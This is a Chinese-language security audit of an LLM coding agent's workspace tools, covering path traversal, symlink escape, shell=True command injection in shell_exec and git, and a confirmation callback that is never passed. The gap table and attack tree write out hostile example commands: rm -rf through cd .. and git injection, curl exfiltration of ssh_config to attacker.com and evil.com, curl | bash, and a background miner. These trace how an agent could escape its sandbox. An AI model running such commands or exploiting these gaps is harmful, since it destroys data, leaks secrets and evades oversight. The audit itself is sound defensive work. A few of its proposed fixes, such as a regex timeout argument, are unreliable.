# Workspace 安全边界审计

> 审计日期: 2026-07-26
> 审计方式: 只读，不修改代码

---

## 1. 安全架构总览

```
                    ┌──────────────────────────────────────┐
                    │          LLM (Agent 大脑)              │
                    └──────────┬───────────────────────────┘
                               │ tool_calls
                               ▼
              ┌────────────────────────────────────┐
              │       Tool 层 (swe/tools.py)         │
              │  _resolve_tool_path() 首层防护       │
              │  * read_file / write_file / edit     │
              │  * grep (自实现 Python 搜索,非 shell) │
              │  * shell_exec (subprocess + cwd 限制) │
              │  * git (subprocess + cwd 限制)        │
              │  * open_in_browser                    │
              └──────────┬─────────────────────────┘
                         │
              ┌──────────▼─────────────────────────┐
              │   Workspace 类 (workspace/workspace.py)  │
              │   _validate_path() 二层防护            │
              │   * relative_to 路径穿越检测            │
              │   * agent_id 校验 (无 / \ ..)           │
              └──────────┬─────────────────────────┘
                         │
              ┌──────────▼─────────────────────────┐
              │   操作系统文件系统                      │
              │   * symlink (OS 级功能)               │
              │   * 子进程工作目录继承                   │
              │   * 网络访问 (无限制)                   │
              └────────────────────────────────────┘
```

---

## 2. 逐个工具分析

### 2.1 read_file

| 检查项 | 状态 | 说明 |
|--------|------|------|
| 路径穿越防护 | ✅ `_resolve_tool_path()` | `relative_to()` 检测 |
| symlink 防护 | ❌ **无检测** | Path.resolve() 追踪 symlink，但未阻止访问指向外部的 symlink |
| 文件大小限制 | ✅ 10MB | `_MAX_TEXT_SIZE` |
| 二进制检测 | ✅ 前 8KB null 检测 | |
| 绝对路径 | ✅ 检查 in project_path/workspace | |
| 相对路径 ../ | ✅ relative_to 拒绝 | |
| 超时 | ❌ **无超时** | 无路径解析超时；大文件读取阻塞（10MB 边界附近） |
| 编码安全 | ✅ UTF-8 → locale fallback | |

**路径**: `params["path"]` → `_resolve_tool_path()` → `full.read_text()`

**关键代码**: `tools.py:187`
```python
is_safe, full, err_msg = _resolve_tool_path(context, path)
```

---

### 2.2 write_file

| 检查项 | 状态 | 说明 |
|--------|------|------|
| 路径穿越 | ✅ `_resolve_tool_path()` | |
| symlink 写入 | ❌ **无检测** | 若目标文件是 symlink 到 workspace 外部，写入会逃逸 |
| 目录自动创建 | ✅ `parent.mkdir(parents=True, exist_ok=True)` | |
| 文件大小上限 | ⚠️ 无硬限制 | Workspace.write() 检查 `max_file_size=10MB`，但工具层直接 Path.write_text() 绕过此检查 |
| 覆盖保护 | ❌ **无** | 静默覆盖已有文件 |
| 写入 workspace 外部 | ⚠️ **有条件** | `_resolve_tool_path` 拒绝，但 shell cd .. 可绕过 |

**路径**: `params["path"]` → `_resolve_tool_path()` → 直接 `full.write_text()`（绕过 Workspace.write）

**关键差距**: WriteFileTool 不使用 Workspace.write()，而是直接调用 `Path.write_text()`（`tools.py:276`）。Workspace.write() 中的文件大小检查、磁盘空间检查、manifest 追踪全部被绕过。

---

### 2.3 edit

| 检查项 | 状态 | 说明 |
|--------|------|------|
| 路径穿越 | ✅ `_resolve_tool_path()` | |
| symlink 写入 | ❌ **无检测** | 同 write_file |
| 备份恢复 | ✅ `original_content` 备份 | 编辑失败时恢复 |
| 正则 RE dos | ⚠️ **无限制** | 用户输入的正则可导致 ReDoS（`re.sub`/`re.subn`） |
| 超时 | ❌ **无** | 无 subprocess 调用，但大文件正则可能慢 |

**路径**: `params["path"]` → `_resolve_tool_path()` → `full.read_text()` → `full.write_text()`

---

### 2.4 grep

| 检查项 | 状态 | 说明 |
|--------|------|------|
| 路径穿越 | ⚠️ **不适用** | grep 使用 `root.glob(glob_pattern)` 在 workspace 根目录下搜索 |
| symlink 跟随 | ⚠️ `rglob("*")` 跟随 symlink | 若 workspace 内有指向外部的 symlink 目录，grep 可读取外部文件 |
| 命令注入 | ✅ **无 shell** | 纯 Python `re.compile()` + `Path.read_text()` |
| ReDoS | ⚠️ 风险同 edit | LLM 构造的恶意识别模式可导致 CPU 耗尽 |
| .git 豁免 | ✅ `_IGNORE_DIRS` 跳过 | |
| 跳过目录 | ⚠️ 仅跳过路径段检查 | 若 symlink 目标在 `_IGNORE_DIRS` 中，不会被 glob 匹配到 |

**关键代码**: `tools.py:441`
```python
for f in sorted(root.glob(glob_pattern)):
    if not f.is_file():
        continue
    rel = f.relative_to(root).as_posix()
    parts = rel.split("/")
    if any(part in _IGNORE_DIRS for part in parts[:-1]):
        continue
```

**关键差距**: `root` 是 `context.project_path or context.workspace_path`，若 project_path 设定到 workspace 外部，grep 的搜索范围会超出 workspace。

---

### 2.5 shell_exec

| 检查项 | 状态 | 说明 |
|--------|------|------|
| cwd 限制 | ✅ `cwd=project_path or workspace_path` | |
| shell=True | ⚠️ **高风险** | 通过 cmd.exe / bash 执行，cd .. 可直接逃逸 |
| cd .. 逃逸 | ❌ **无法阻止** | `cd .. && cat ../../etc/passwd` 在 shell 层完全不受 Python 路径检测约束 |
| 路径穿越防护 | ❌ **无** | shell_exec 不经过 `_resolve_tool_path()` |
| 命令注入 | ❌ **shell=True 即为注入** | `params["command"]` 直接拼接并执行 |
| 写入外部 | ❌ **无法阻止** | `echo x > ../../outside/file.txt` 在 shell 层无限制 |
| 网络访问 | ❌ **无限制** | shell_exec 可执行 curl/wget/nc，访问任何网络地址 |
| 进程 fork | ❌ **无限制** | shell_exec 可启动任意后台进程 |
| 超时 | ✅ subprocess timeout | |
| stdout 大小限制 | ✅ 10000 chars | |
| on_confirm 回调 | ⚠️ 定义但从不传递 | `context.config.get("on_confirm")` 总是 None |
| 命令翻译 | ✅ Windows 兼容性翻译 | `_translate_cmd()` |

**关键代码**: `tools.py:543`:
```python
cwd = str(context.project_path or context.workspace_path)
r = subprocess.run(cmd, shell=True, cwd=cwd, ...)
```

**关键差距**: `shell=True` 使得所有 Python 层的路径检测全部失效。Agent 可以通过 `cd ..` 访问和修改整个文件系统。这是 **A 层无法防御** 的安全缺口。

---

### 2.6 git

| 检查项 | 状态 | 说明 |
|--------|------|------|
| cwd 限制 | ✅ `cwd=str(context.workspace_path)` | 硬编码 workspace 路径 |
| 路径穿越 | ❌ 理论上无（git 命令本身限制） | git 在 workspace dir 内执行 |
| `on_confirm` 回调 | ⚠️ 定义但从不传递 | 同 shell_exec |
| git config 写敏感信息 | ❌ **无限制** | `git config user.email agent@zmai` 无感知 |
| 子模块 exploit | ❌ **无防护** | `.gitmodules` 可指向外部仓库 |
| 超时 | ✅ | |

**关键代码**: `tools.py:588`:
```python
r = subprocess.run(f"git {args}", shell=True, cwd=str(context.workspace_path), ...)
```

**关键差距**: 使用 `shell=True`。`args` 拼接进 `git {args}`，若 `args` 含分号可执行任意命令:
```
git "status; cat /etc/passwd"
```
会执行 `git status; cat /etc/passwd`。

---

### 2.7 open_in_browser

| 检查项 | 状态 | 说明 |
|--------|------|------|
| 路径穿越 | ✅ `_resolve_tool_path()` | |
| symlink URL 跳转 | ✅ 文件存在检查 | 仅打开本地文件 |
| file:// 协议 | ✅ 仅路径操作 | |
| 命令行注入 | ⚠️ 路径穿过 `start`/`open`/`xdg-open` | 但参数是绝对路径，无注入机会 |

---

## 3. 分层安全总结

### A. ZMAI 应用层能保证的安全 ✅

| 防护 | 覆盖工具 | 实现 |
|------|----------|------|
| 路径穿越防护 (../) | read, write, edit, open_in_browser | `_resolve_tool_path()` + `relative_to()` |
| 绝对路径范围检查 | read, write, edit, open_in_browser | 必须 in project_path or workspace_path |
| Agent ID 防穿越 | Workspace._agent_path | 禁止 / \ .. |
| 文件大小限制 | read (10MB), write (10MB-Workspace层) | `_MAX_TEXT_SIZE` |
| 二进制文件读保护 | read | 前 8KB null 检测 |
| grep 无 shell | grep | Python re, 非 shell |
| 超时 | shell_exec, git, open_in_browser | `subprocess.run(timeout=...)` |

### B. 操作系统级沙箱才能保证的安全 🛡️

| 防护 | 当前状态 | 说明 |
|------|----------|------|
| symlink 逃逸 | ❌ 无法防御 | Path.resolve() 会跟随 symlink。若 workspace 内有指向 `/etc/passwd` 的 symlink，read_file 可读取。Workspace 层在写入时未检查路径是否为 symlink |
| file:// URL 读取 | ❌ 无限制 | open_in_browser 的文件路径解析后，浏览器可打开任意本地文件 |
| 进程 fork | ❌ shell_exec 可 fork | `nohup python -m http.server &` 可在后台长期运行 |
| 网络 egress | ❌ 无限制 | shell_exec 可 curl/wget/nc 访问任何 IP:PORT |
| 子进程资源限制 | ❌ 无 ulimit/cgroups | shell 可 fork bomb, disk full, OOM |
| 文件系统隔离 | ❌ 无 mount namespace | shell cd .. 可修改整个文件系统 |
| 时间隔离 | ❌ 无 CPU 时间限制 | Agent 可执行死循环 |

### C. 当前无法保证的严重安全缺口 🔴

| # | 缺口 | 严重性 | 工具 | 利用方式 |
|---|------|--------|------|----------|
| C1 | **shell=True + cd ..** | **CRITICAL** | shell_exec | `cd .. && rm -rf /important` — shell 完全不受 ZMAI 路径控制 |
| C2 | **git 命令注入** | **CRITICAL** | git | `git "status; rm -rf /"` — `shell=True` + 字符串拼接 |
| C3 | **write_file 绕过 Workspace** | **HIGH** | write_file | 直接调用 `Path.write_text()`，不经过 Workspace.write() 的大小/目录/权限检查 |
| C4 | **symlink 写入逃逸** | **HIGH** | write_file, edit | 若 workspace 内有人放置 symlink → /etc/cron.d/evil，写入可逃逸 |
| C5 | **网络访问无限制** | **HIGH** | shell_exec | `curl -X POST --data "$(cat /etc/ssh/ssh_config)" http://attacker.com/` |
| C6 | **process fork 后台驻留** | **MEDIUM** | shell_exec | `nohup python -m http.server 8888 &` 长期泄漏 |
| C7 | **ReDoS 无防护** | **MEDIUM** | grep, edit | LLM 构造 `(a+)+b` 可导致 CPU 100% |
| C8 | **on_confirm 回调失效** | **MEDIUM** | shell_exec, git | 回调定义在 config 中但从不传递，安全确认形同虚设 |
| C9 | **grep 搜索范围随 project_path 扩展** | **LOW** | grep | `root=project_path` 超出 workspace 时，搜索范围扩大 |

---

## 4. 攻击树

```
LLM 控制的 Agent
    │
    ├─ 通过 read_file 读取任意文件
    │   ├─ ../etc/passwd  →  _resolve_tool_path 拒绝 ✅
    │   └─ symlink → /etc/passwd → pathlib 跟随 ❌ C4
    │
    ├─ 通过 write_file 写入任意文件
    │   ├─ ../tmp/evil.sh  →  _resolve_tool_path 拒绝 ✅
    │   ├─ symlink → /etc/cron.d/evil → 无检查 ❌ C4
    │   └─ 10MB+ 文件 → Workspace.write() 阻止，但工具层不调用 ❌ C3
    │
    ├─ 通过 shell_exec 完全逃逸
    │   ├─ cd .. && rm -rf /  → 无防护 ❌ C1
    │   ├─ curl | bash → 远程代码执行 ❌ C5
    │   └─ nohup miner & → 后台进程 ❌ C6
    │
    └─ 通过 git 命令注入
        └─ git "status; curl http://evil.com/exfil?data=$(cat /etc/hostname)"
            → shell=True 拼接执行 ❌ C2
```

---

## 5. 修复优先级

| 优先级 | 缺口 | 最小修复 |
|--------|------|----------|
| **P0** | C1 shell cd.. 逃逸 | shell_exec 使用 `shlex.quote()` + `cwd` 约束，或选项白名单（安全模式） |
| **P0** | C2 git 命令注入 | 使用 `["git", arg1, arg2]` 而非 `f"git {args}"` + `shell=True` |
| **P1** | C3 write_file 绕过 Workspace | 工具层调用 `Workspace.write()` 而非 `Path.write_text()` |
| **P1** | C4 symlink 写入逃逸 | 写入前检查 `full.is_symlink()` 或 `full.resolve() != full` |
| **P1** | C8 on_confirm 死代码 | Runtime/SWEAgent 在构造 ToolContext 时传入 `on_confirm` 回调 |
| **P2** | C5 网络访问 | shell_exec 增加 `--no-curl-wget-nc` 环境变量开关，或使用网络命名空间（需 OS 支持） |
| **P2** | C7 ReDoS | 限制 regex 超时（`re.compile(pattern, timeout=1)` 或外部信号） |
| **P3** | C6 进程驻留 | subprocess 增加 `preexec_fn` 或 Windows job object 限制子进程生命周期 |
